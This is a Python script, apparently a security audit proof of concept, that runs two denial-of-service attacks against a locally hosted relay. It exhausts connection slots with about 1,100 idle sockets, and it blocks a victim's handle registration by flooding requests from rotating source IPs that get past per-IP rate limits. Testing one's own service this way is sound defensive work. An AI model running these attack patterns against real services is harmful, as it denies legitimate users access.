#!/usr/bin/env python3
"""Connection-slot exhaustion (one source, documented backstop) and a
challenge-binding DoS against a KNOWN victim address (2 pending/binding,
5/h per-address issue limit)."""
import socket, time
import rr

# connection-slot exhaustion: hold connect()-only sockets (never send a byte)
socks = []
t0 = time.time()
try:
    for i in range(1100):
        s = socket.socket(); s.settimeout(1)
        s.connect(("127.0.0.1", rr.RELAY[1]))
        socks.append(s)
except OSError as e:
    print("connect refused after", len(socks), "sockets:", e)
print("opened", len(socks), "connections in %.2fs" % (time.time() - t0))
t0 = time.time()
try:
    st, h, b = rr.request("GET", "/healthz", timeout=3)
    print("healthz while", len(socks), "idle conns open:", st, "in %.2fs" % (time.time() - t0))
except OSError as e:
    print("healthz BLOCKED while conns open: %r after %.2fs" % (e, time.time() - t0))
print("waiting for HEAD_TIMEOUT (10s) to free slots...")
time.sleep(11)
st, h, b = rr.request("GET", "/healthz", timeout=5)
print("healthz after waiting past head timeout:", st)
for s in socks:
    s.close()

# challenge DoS against a known victim address: attacker doesn't control the
# address but knows it (e.g. observed elsewhere) and spams /v1/handles for
# IT from many source IPs (bypassing per-IP 10/h), filling the 2-per-binding
# cap and the per-address 5/h cap, so the real owner's own registration is
# blocked.
victim_addr = "victim-known:address"
results = []
for i in range(8):
    st, b = rr.post("/v1/handles", rr.reg_body(victim_addr), src="127.0.0.%d" % (60 + i))
    results.append((st, b.get("error") if isinstance(b, dict) else b))
print("8 registration attempts for the victim's address, each from a fresh IP:", results)
print("victim's OWN registration for their own address, from yet another fresh IP:",
      rr.post("/v1/handles", rr.reg_body(victim_addr), src="127.0.0.70"))
